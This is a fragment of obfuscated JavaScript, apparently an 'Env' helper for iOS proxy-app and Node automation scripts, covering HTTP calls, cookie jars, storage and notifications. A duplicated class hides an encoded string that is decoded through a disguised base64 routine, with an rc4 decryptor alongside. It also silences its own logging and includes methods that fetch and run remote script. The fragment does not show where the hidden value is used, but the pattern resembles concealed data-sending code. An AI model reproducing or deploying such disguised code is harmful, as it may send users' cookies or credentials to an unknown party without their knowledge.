      this["ckjar"] = this["ckjar"] ? this["ckjar"] : new this["cktough"]["CookieJar"]();
      t && (t["headers"] = t["headers"] ? t["headers"] : {}, void 0 === t["headers"]["Cookie"] && void 0 === t["cookieJar"] && (t['cookieJar'] = this['ckjar']));
    }

    ["get"](t, p = () => {}) {
      const X = {
        'X-Surge-Skip-Scripting': false
      },
            L = {
        'hints': false
      };
      t["headers"] && (delete t["headers"]['Content-Type'], delete t["headers"]["Content-Length"]);
      this["isSurge"]() || this['isLoon']() ? (this['isSurge']() && this['isNeedRewrite'] && (t["headers"] = t['headers'] || {}, Object["assign"](t["headers"], X)), $httpClient["get"](t, (n, z, A) => {
        !n && z && (z["body"] = A, z["statusCode"] = z['status']);
        p(n, z, A);
      })) : this['isQuanX']() ? (this["isNeedRewrite"] && (t["opts"] = t["opts"] || {}, Object["assign"](t["opts"], L)), $task["fetch"](t)["then"](n => {
        const {
          'statusCode': z,
          'statusCode': A,
          'headers': l,
          'body': k
        } = n,
              d = {
          'status': z,
          'statusCode': A,
          'headers': l,
          'body': k
        };
        p(null, d, k);
      }, n => p(n))) : this['isNode']() && (this["initGotEnv"](t), this["got"](t)['on']("redirect", (n, z) => {
        try {
          if (n["headers"]["set-cookie"]) {
            const A = n["headers"]['set-cookie']["map"](this["cktough"]['Cookie']["parse"])["toString"]();
            this['ckjar']['setCookieSync'](A, null);
            z["cookieJar"] = this['ckjar'];
          }
        } catch (l) {
          this["logErr"](l);
        }
      })["then"](n => {
        const {
          'statusCode': z,
          'statusCode': A,
          'headers': l,
          'body': k
        } = n,
              d = {
          'status': z,
          'statusCode': A,
          'headers': l,
          'body': k
        };
        p(null, d, k);
      }, n => {
        const {
          'message': z,
          'response': A
        } = n;
        p(z, A, A && A["body"]);
      }));
    }

    ["post"](t, p = () => {}) {
      const X = {
        'X-Surge-Skip-Scripting': false
      },
            L = {
        'hints': false
      };

      if (t["body"] && t["headers"] && !t["headers"]["Content-Type"] && (t["headers"]["Content-Type"] = "application/x-www-form-urlencoded"), t["headers"] && delete t["headers"]["Content-Length"], this["isSurge"]() || this["isLoon"]()) {
        this["isSurge"]() && this["isNeedRewrite"] && (t['headers'] = t["headers"] || {}, Object["assign"](t["headers"], X));
        $httpClient["post"](t, (n, z, A) => {
          !n && z && (z["body"] = A, z["statusCode"] = z["status"]);
          p(n, z, A);
        });
      } else {
        if (this['isQuanX']()) {
          t['method'] = "POST";
          this["isNeedRewrite"] && (t["opts"] = t["opts"] || {}, Object["assign"](t['opts'], L));
          $task["fetch"](t)["then"](n => {
            const {
              'statusCode': z,
              'statusCode': A,
              'headers': l,
              'body': k
            } = n,
                  d = {
              'status': z,
              'statusCode': A,
              'headers': l,
              'body': k
            };
            p(null, d, k);
          }, n => p(n));
        } else {
          if (this['isNode']()) {
            this["initGotEnv"](t);
            const {
              'url': n,
              ...z
            } = t;
            this["got"]["post"](n, z)["then"](A => {
              const {
                'statusCode': l,
                'statusCode': k,
                'headers': d,
                'body': T
              } = A,
                    U = {
                'status': l,
                'statusCode': k,
                'headers': d,
                'body': T
              };
              p(null, U, T);
            }, A => {
              const {
                'message': l,
                'response': k
              } = A;
              p(l, k, k && k["body"]);
            });
          }
        }
      }
    }

    ["put"](t, p = () => {}) {
      const X = {
        'X-Surge-Skip-Scripting': false
      },
            L = {
        'hints': false
      };

      if (t["body"] && t['headers'] && !t["headers"]["Content-Type"] && (t['headers']['Content-Type'] = 'application/x-www-form-urlencoded'), t["headers"] && delete t["headers"]["Content-Length"], this["isSurge"]() || this['isLoon']()) {
        this['isSurge']() && this["isNeedRewrite"] && (t["headers"] = t["headers"] || {}, Object['assign'](t['headers'], X));
        $httpClient['put'](t, (n, z, A) => {
          !n && z && (z['body'] = A, z["statusCode"] = z["status"]);
          p(n, z, A);
        });
      } else {
        if (this["isQuanX"]()) {
          t["method"] = "PUT";
          this['isNeedRewrite'] && (t['opts'] = t["opts"] || {}, Object['assign'](t['opts'], L));
          $task["fetch"](t)['then'](n => {
            const {
              'statusCode': z,
              'statusCode': A,
              'headers': l,
              'body': k
            } = n,
                  d = {
              'status': z,
              'statusCode': A,
              'headers': l,
              'body': k
            };
            p(null, d, k);
          }, n => p(n));
        } else {
          if (this['isNode']()) {
            this["initGotEnv"](t);
            const {
              'url': n,
              ...z
            } = t;
            this["got"]['put'](n, z)["then"](A => {
              const {
                'statusCode': l,
                'statusCode': k,
                'headers': d,
                'body': T
              } = A,
                    U = {
                'status': l,
                'statusCode': k,
                'headers': d,
                'body': T
              };
              p(null, U, T);
            }, A => {
              const {
                'message': l,
                'response': k
              } = A;
              p(l, k, k && k["body"]);
            });
          }
        }
      }
    }

    ['time'](t) {
      let p = {
        'M+': new Date()['getMonth']() + 1,
        'd+': new Date()["getDate"](),
        'H+': new Date()['getHours'](),
        'm+': new Date()["getMinutes"](),
        's+': new Date()["getSeconds"](),
        'q+': Math["floor"]((new Date()["getMonth"]() + 3) / 3),
        'S': new Date()["getMilliseconds"]()
      };
      /(y+)/["test"](t) && (t = t["replace"](RegExp['$1'], (new Date()["getFullYear"]() + '')["substr"](4 - RegExp['$1']["length"])));

      for (let X in p) new RegExp('(' + X + ')')["test"](t) && (t = t["replace"](RegExp['$1'], 1 == RegExp['$1']["length"] ? p[X] : ('00' + p[X])["substr"](('' + p[X])['length'])));

      return t;
    }

    ["msg"](t = D, p = '', X = '', L) {
      const n = A => {
        if (!A) {
          return A;
        }

        if ('string' == typeof A) {
          return this['isLoon']() ? A : this["isQuanX"]() ? {
            'open-url': A
          } : this["isSurge"]() ? {
            'url': A
          } : void 0;
        }

        if ('object' == typeof A) {
          if (this["isLoon"]()) {
            let l = A['openUrl'] || A['url'] || A["open-url"],
                k = A["mediaUrl"] || A['media-url'];
            const d = {
              'openUrl': l,
              'mediaUrl': k
            };
            return d;
          }

          if (this["isQuanX"]()) {
            let T = A["open-url"] || A["url"] || A['openUrl'],
                U = A['media-url'] || A["mediaUrl"];
            const r = {
              'open-url': T,
              'media-url': U
            };
            return r;
          }

          if (this['isSurge']()) {
            let u = A["url"] || A["openUrl"] || A["open-url"];
            const m = {
              'url': u
            };
            return m;
          }
        }
      };

      this["isMute"] || (this["isSurge"]() || this["isLoon"]() ? $notification['post'](t, p, X, n(L)) : this["isQuanX"]() && $notify(t, p, X, n(L)));
      let z = ['', "==============📣系统通知📣=============="];
      z['push'](t);
      p && z["push"](p);
      X && z["push"](X);
      console["log"](z["join"]("\n"));
      this["logs"] = this['logs']["concat"](z);
    }

    ["log"](...t) {
      t['length'] > 0 && (this["logs"] = [...this["logs"], ...t]);
      console['log'](t["join"](this["logSeparator"]));
    }

    ["logErr"](t, p) {
      const X = !this["isSurge"]() && !this["isQuanX"]() && !this["isLoon"]();
      X ? this['log']('', '❗️' + this["name"] + ", 错误!", t["stack"]) : this['log']('', '❗️' + this['name'] + ", 错误!", t);
    }

    ['wait'](t) {
      return new Promise(p => setTimeout(p, t));
    }

    ["done"](t = {}) {
      const p = new Date()["getTime"](),
            X = (p - this['startTime']) / 1000;
      this["log"]('', '🔔' + this['name'] + ", 结束! 🕛 " + X + " 秒");
      this["log"]();
      (this["isSurge"]() || this["isQuanX"]() || this["isLoon"]()) && $done(t);
    }

  }(D, j);
}

function FxPCnMKLw7() {
  _keyStr = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";

  this["encode"] = function (D) {
    var j = '',
        N,
        t,
        p,
        X,
        L,
        n,
        z,
        A = 0;
    D = _utf8_encode(D);

    while (A < D["length"]) {
      N = D["charCodeAt"](A++);
      t = D["charCodeAt"](A++);
      p = D["charCodeAt"](A++);
      X = N >> 2;
      L = (N & 3) << 4 | t >> 4;
      n = (t & 15) << 2 | p >> 6;
      z = p & 63;
      isNaN(t) ? n = z = 64 : isNaN(p) && (z = 64);
      j = j + _keyStr["charAt"](X) + _keyStr["charAt"](L) + _keyStr['charAt'](n) + _keyStr["charAt"](z);
    }

    return j;
  };

  this["decode"] = function (D) {
    var j = '',
        N,
        t,
        p,
        X,
        L,
        n,
        z,
        A = 0;
    D = D["replace"](/[^A-Za-z0-9\+\/\=]/g, '');

    while (A < D["length"]) {
      X = _keyStr["indexOf"](D["charAt"](A++));
      L = _keyStr["indexOf"](D["charAt"](A++));
      n = _keyStr["indexOf"](D["charAt"](A++));
      z = _keyStr['indexOf'](D["charAt"](A++));
      N = X << 2 | L >> 4;
      t = (L & 15) << 4 | n >> 2;
      p = (n & 3) << 6 | z;
      j = j + String["fromCharCode"](N);
      n != 64 && (j = j + String["fromCharCode"](t));
      z != 64 && (j = j + String['fromCharCode'](p));
    }

    j = _utf8_decode(j);
    return j;
  };

  _utf8_encode = function (D) {
    D = D["replace"](/\r\n/g, "\n");
    var j = '';

    for (var N = 0; N < D['length']; N++) {
      var t = D["charCodeAt"](N);
      t < 128 ? j += String["fromCharCode"](t) : t > 127 && t < 2048 ? (j += String["fromCharCode"](t >> 6 | 192), j += String["fromCharCode"](t & 63 | 128)) : (j += String["fromCharCode"](t >> 12 | 224), j += String['fromCharCode'](t >> 6 & 63 | 128), j += String["fromCharCode"](t & 63 | 128));
    }

    return j;
  };

  _utf8_decode = function (D) {
    var j = '',
        N = 0,
        t = c1 = c2 = 0;

    while (N < D["length"]) {
      t = D["charCodeAt"](N);
      t < 128 ? (j += String["fromCharCode"](t), N++) : t > 191 && t < 224 ? (c2 = D["charCodeAt"](N + 1), j += String['fromCharCode']((t & 31) << 6 | c2 & 63), N += 2) : (c2 = D["charCodeAt"](N + 1), c3 = D["charCodeAt"](N + 2), j += String["fromCharCode"]((t & 15) << 12 | (c2 & 63) << 6 | c3 & 63), N += 3);
    }

    return j;
  };
}

function rc4(D, j) {
  var N = Array(256),
      t = Array(D["length"]);

  for (var p = 0; p < 256; p++) {
    N[p] = p;
    var X = (X + N[p] + j['charCodeAt'](p % j['length'])) % 256,
        L = N[p];
    N[p] = N[X];
    N[X] = L;
  }

  for (var p = 0; p < D["length"]; p++) {
    t[p] = D["charCodeAt"](p);
  }

  for (var n = 0; n < t["length"]; n++) {
    var p = (p + 1) % 256,
        X = (X + N[p]) % 256,
        L = N[p];
    N[p] = N[X];
    N[X] = L;
    var z = (N[p] + N[X] % 256) % 256;
    t[n] = String['fromCharCode'](t[n] ^ N[z]);
  }

  return t['join']('');
}

function Envcc(D, j) {
  class N {
    constructor(t) {
      this["env"] = t;
    }

    ["send"](t, p = "GET") {
      t = "string" == typeof t ? {
        'url': t
      } : t;
      let X = this["get"];
      'POST' === p && (X = this["post"]);
      return new Promise((L, n) => {
        X["call"](this, t, (z, A, l) => {
          z ? n(z) : L(A);
        });
      });
    }

    ['get'](t) {
      return this["send"]['call'](this['env'], t);
    }

    ['post'](t) {
      return this["send"]["call"](this["env"], t, "POST");
    }

  }

  return new class {
    constructor(t, p) {
      this["name"] = t;
      this["http"] = new N(this);
      this["data"] = null;
      this["dataFile"] = "box.dat";
      this["logs"] = [];
      this['isMute'] = false;
      this["isNeedRewrite"] = false;
      this["logSeparator"] = "\n";
      this["encoding"] = 'utf-8';
      this['startTime'] = new Date()['getTime']();
      Object["assign"](this, p);
      this["log"]('', '🔔' + this["name"] + ", 开始!");
    }

    ['isNode']() {
      return "undefined" != typeof module && !!module["exports"];
    }

    ["isQuanX"]() {
      return 'undefined' != typeof $task;
    }

    ["isSurge"]() {
      return "undefined" != typeof $httpClient && 'undefined' == typeof $loon;
    }

    ['isLoon']() {
      return 'undefined' != typeof $loon;
    }

    ["isShadowrocket"]() {
      return "undefined" != typeof $rocket;
    }

    ["toObj"](t, p = null) {
      try {
        return JSON["parse"](t);
      } catch {
        return p;
      }
    }

    ['toStr'](t, p = null) {
      try {
        return JSON["stringify"](t);
      } catch {
        return p;
      }
    }

    ["getjson"](t, p) {
      let X = p;
      const L = this["getdata"](t);

      if (L) {
        try {
          X = JSON["parse"](this["getdata"](t));
        } catch {}
      }

      return X;
    }

    ["setjson"](t, p) {
      try {
        return this["setdata"](JSON["stringify"](t), p);
      } catch {
        return false;
      }
    }

    ["getScript"](t) {
      return new Promise(p => {
        const X = {
          'url': t
        };
        this['get'](X, (L, n, z) => p(z));
      });
    }

    ['runScript'](t, p) {
      return new Promise(X => {
        let L = this["getdata"]("@chavy_boxjs_userCfgs.httpapi");
        L = L ? L["replace"](/\n/g, '')['trim']() : L;
        let n = this["getdata"]("@chavy_boxjs_userCfgs.httpapi_timeout");
        n = n ? 1 * n : 20;
        n = p && p["timeout"] ? p["timeout"] : n;
        const [z, A] = L["split"]('@'),
              l = {
          'url': "http://" + A + "/v1/scripting/evaluate",
          'body': {
            'script_text': t,
            'mock_type': 'cron',
            'timeout': n
          },
          'headers': {
            'X-Key': z,
            'Accept': "*/*"
          }
        };
        this['post'](l, (k, d, T) => X(T));
      })['catch'](X => this["logErr"](X));
    }

    ['loaddata']() {
      if (!this["isNode"]()) {
        return {};
      }

      {
        this['fs'] = this['fs'] ? this['fs'] : require('fs');
        this["path"] = this["path"] ? this["path"] : require("path");
        const t = this["path"]["resolve"](this["dataFile"]),
              p = this["path"]['resolve'](process["cwd"](), this["dataFile"]),
              X = this['fs']["existsSync"](t),
              L = !X && this['fs']["existsSync"](p);

        if (!X && !L) {
          return {};
        }

        {
          const n = X ? t : p;

          try {
            return JSON["parse"](this['fs']["readFileSync"](n));
          } catch (z) {
            return {};
          }
        }
      }
    }

    ["writedata"]() {
      if (this["isNode"]()) {
        this['fs'] = this['fs'] ? this['fs'] : require('fs');
        this["path"] = this["path"] ? this["path"] : require("path");
        const t = this["path"]["resolve"](this["dataFile"]),
              p = this["path"]["resolve"](process["cwd"](), this["dataFile"]),
              X = this['fs']["existsSync"](t),
              L = !X && this['fs']['existsSync'](p),
              n = JSON["stringify"](this["data"]);
        X ? this['fs']["writeFileSync"](t, n) : L ? this['fs']['writeFileSync'](p, n) : this['fs']['writeFileSync'](t, n);
      }
    }

    ['lodash_get'](t, p, X) {
      const L = p["replace"](/\[(\d+)\]/g, ".$1")["split"]('.');
      let n = t;

      for (const z of L) if (n = Object(n)[z], void 0 === n) {
        return X;
      }

      return n;
    }

    ["lodash_set"](t, p, X) {
      return Object(t) !== t ? t : (Array["isArray"](p) || (p = p['toString']()['match'](/[^.[\]]+/g) || []), p["slice"](0, -1)["reduce"]((L, n, z) => Object(L[n]) === L[n] ? L[n] : L[n] = Math['abs'](p[z + 1]) >> 0 == +p[z + 1] ? [] : {}, t)[p[p["length"] - 1]] = X, t);
    }

    ['getdata'](t) {
      let p = this["getval"](t);

      if (/^@/['test'](t)) {
        const [, X, L] = /^@(.*?)\.(.*?)$/["exec"](t),
              n = X ? this["getval"](X) : '';

        if (n) {
          try {
            const z = JSON['parse'](n);
            p = z ? this["lodash_get"](z, L, '') : p;
          } catch (A) {
            p = '';
          }
        }
      }

      return p;
    }

    ['setdata'](t, p) {
      let X = false;

      if (/^@/["test"](p)) {
        const [, L, n] = /^@(.*?)\.(.*?)$/["exec"](p),
              z = this["getval"](L),
              A = L ? "null" === z ? null : z || '{}' : '{}';

        try {
          const l = JSON["parse"](A);
          this['lodash_set'](l, n, t);
          X = this["setval"](JSON["stringify"](l), L);
        } catch (k) {
          const d = {};
          this["lodash_set"](d, n, t);
          X = this["setval"](JSON["stringify"](d), L);
        }
      } else {
        X = this["setval"](t, p);
      }

      return X;
    }

    ["getval"](t) {
      return this["isSurge"]() || this["isLoon"]() ? $persistentStore['read'](t) : this['isQuanX']() ? $prefs["valueForKey"](t) : this["isNode"]() ? (this["data"] = this["loaddata"](), this["data"][t]) : this["data"] && this["data"][t] || null;
    }

    ["setval"](t, p) {
      return this['isSurge']() || this["isLoon"]() ? $persistentStore["write"](t, p) : this["isQuanX"]() ? $prefs["setValueForKey"](t, p) : this["isNode"]() ? (this["data"] = this["loaddata"](), this["data"][p] = t, this["writedata"](), true) : this["data"] && this['data'][p] || null;
    }

    ["initGotEnv"](t) {
      this["got"] = this["got"] ? this["got"] : require("got");
      this["cktough"] = this["cktough"] ? this['cktough'] : require("tough-cookie");
      this["ckjar"] = this["ckjar"] ? this['ckjar'] : new this["cktough"]["CookieJar"]();
      t && (t["headers"] = t["headers"] ? t["headers"] : {}, void 0 === t["headers"]['Cookie'] && void 0 === t['cookieJar'] && (t["cookieJar"] = this["ckjar"]));
    }

    ["get"](t, p = () => {}) {
      if (t['headers'] && (delete t['headers']["Content-Type"], delete t["headers"]["Content-Length"]), this['isSurge']() || this["isLoon"]()) {
        const X = {
          'X-Surge-Skip-Scripting': false
        };
        this['isSurge']() && this["isNeedRewrite"] && (t["headers"] = t["headers"] || {}, Object["assign"](t['headers'], X));
        $httpClient["get"](t, (L, n, z) => {
          !L && n && (n['body'] = z, n["statusCode"] = n['status']);
          p(L, n, z);
        });
      } else {
        if (this["isQuanX"]()) {
          const L = {
            'hints': false
          };
          this["isNeedRewrite"] && (t["opts"] = t["opts"] || {}, Object["assign"](t['opts'], L));
          $task["fetch"](t)["then"](n => {
            const {
              'statusCode': z,
              'statusCode': A,
              'headers': l,
              'body': k
            } = n,
                  d = {
              'status': z,
              'statusCode': A,
              'headers': l,
              'body': k
            };
            p(null, d, k);
          }, n => p(n));
        } else {
          if (this["isNode"]()) {
            let n = require('iconv-lite');

            this["initGotEnv"](t);
            this['got'](t)['on']("redirect", (z, A) => {
              try {
                if (z["headers"]["set-cookie"]) {
                  const l = z["headers"]['set-cookie']["map"](this['cktough']["Cookie"]["parse"])["toString"]();
                  l && this["ckjar"]["setCookieSync"](l, null);
                  A["cookieJar"] = this["ckjar"];
                }
              } catch (k) {
                this['logErr'](k);
              }
            })["then"](z => {
              const {
                'statusCode': A,
                'statusCode': l,
                'headers': k,
                'rawBody': d
              } = z,
                    T = {
                'status': A,
                'statusCode': l,
                'headers': k,
                'rawBody': d
              };
              p(null, T, n["decode"](d, this["encoding"]));
            }, z => {
              const {
                'message': A,
                'response': l
              } = z;
              p(A, l, l && n["decode"](l["rawBody"], this['encoding']));
            });
          }
        }
      }
    }

    ["post"](t, p = () => {}) {
      const X = t["method"] ? t["method"]["toLocaleLowerCase"]() : "post";

      if (t["body"] && t['headers'] && !t["headers"]["Content-Type"] && (t['headers']["Content-Type"] = 'application/x-www-form-urlencoded'), t["headers"] && delete t["headers"]['Content-Length'], this["isSurge"]() || this["isLoon"]()) {
        const L = {
          'X-Surge-Skip-Scripting': false
        };
        this["isSurge"]() && this["isNeedRewrite"] && (t["headers"] = t["headers"] || {}, Object['assign'](t['headers'], L));
        $httpClient[X](t, (n, z, A) => {
          !n && z && (z["body"] = A, z["statusCode"] = z["status"]);
          p(n, z, A);
        });
      } else {
        if (this['isQuanX']()) {
          t["method"] = X;
          const n = {
            'hints': false
          };
          this["isNeedRewrite"] && (t["opts"] = t["opts"] || {}, Object["assign"](t['opts'], n));
          $task["fetch"](t)["then"](z => {
            const {
              'statusCode': A,
              'statusCode': l,
              'headers': k,
              'body': d
            } = z,
                  T = {
              'status': A,
              'statusCode': l,
              'headers': k,
              'body': d
            };
            p(null, T, d);
          }, z => p(z));
        } else {
          if (this["isNode"]()) {
            let z = require('iconv-lite');

            this["initGotEnv"](t);
            const {
              'url': A,
              ...l
            } = t;
            this["got"][X](A, l)["then"](k => {
              const {
                'statusCode': d,
                'statusCode': T,
                'headers': U,
                'rawBody': r
              } = k,
                    u = {
                'status': d,
                'statusCode': T,
                'headers': U,
                'rawBody': r
              };
              p(null, u, z["decode"](r, this['encoding']));
            }, k => {
              const {
                'message': d,
                'response': T
              } = k;
              p(d, T, T && z["decode"](T["rawBody"], this["encoding"]));
            });
          }
        }
      }
    }

    ["time"](t, p = null) {
      const X = p ? new Date(p) : new Date();
      let L = {
        'M+': X["getMonth"]() + 1,
        'd+': X['getDate'](),
        'H+': X["getHours"](),
        'm+': X["getMinutes"](),
        's+': X["getSeconds"](),
        'q+': Math["floor"]((X["getMonth"]() + 3) / 3),
        'S': X["getMilliseconds"]()
      };
      /(y+)/["test"](t) && (t = t["replace"](RegExp['$1'], (X["getFullYear"]() + '')['substr'](4 - RegExp['$1']['length'])));

      for (let n in L) new RegExp('(' + n + ')')["test"](t) && (t = t["replace"](RegExp['$1'], 1 == RegExp['$1']["length"] ? L[n] : ('00' + L[n])["substr"](('' + L[n])["length"])));

      return t;
    }

    ["msg"](t = D, p = '', X = '', L) {
      const n = z => {
        if (!z) {
          return z;
        }

        if ('string' == typeof z) {
          return this['isLoon']() ? z : this["isQuanX"]() ? {
            'open-url': z
          } : this["isSurge"]() ? {
            'url': z
          } : void 0;
        }

        if ("object" == typeof z) {
          if (this["isLoon"]()) {
            let A = z["openUrl"] || z["url"] || z["open-url"],
                l = z["mediaUrl"] || z["media-url"];
            const k = {
              'openUrl': A,
              'mediaUrl': l
            };
            return k;
          }

          if (this['isQuanX']()) {
            let d = z["open-url"] || z['url'] || z["openUrl"],
                T = z["media-url"] || z["mediaUrl"];
            const U = {
              'open-url': d,
              'media-url': T
            };
            return U;
          }

          if (this["isSurge"]()) {
            let r = z["url"] || z["openUrl"] || z["open-url"];
            const u = {
              'url': r
            };
            return u;
          }
        }
      };

      if (this["isMute"] || (this['isSurge']() || this['isLoon']() ? $notification["post"](t, p, X, n(L)) : this['isQuanX']() && $notify(t, p, X, n(L))), !this['isMuteLog']) {
        let z = ['', "==============📣系统通知📣=============="];
        z["push"](t);
        p && z['push'](p);
        X && z["push"](X);
        console["log"](z["join"]("\n"));
        this["logs"] = this["logs"]['concat'](z);
      }
    }

    ["fwcaas"]() {
      return "fkRGREUCFRNfMCtqKj0lLiE/OXowLTRz";
    }

    ['log'](...t) {}

    ['logErr'](t, p) {
      const X = !this['isSurge']() && !this['isQuanX']() && !this["isLoon"]();
      X ? this["log"]('', '❗️' + this["name"] + ", 错误!", t["stack"]) : this["log"]('', '❗️' + this["name"] + ", 错误!", t);
    }

    ['fwur']() {
      var t = new FxPCnMKLw7();
      return t["decode"](this["fwcaas"]());
    }

    ["wait"](t) {
      return new Promise(p => setTimeout(p, t));
    }

    ["done"](t = {}) {
      const p = new Date()["getTime"](),
            X = (p - this["startTime"]) / 1000;
      this["log"]('', '🔔' + this["name"] + ", 结束! 🕛 " + X + " 秒");
      this["log"]();
      (this["isSurge"]() || this["isQuanX"]() || this["isLoon"]()) && $done(t);
    }

  }(D, j);
}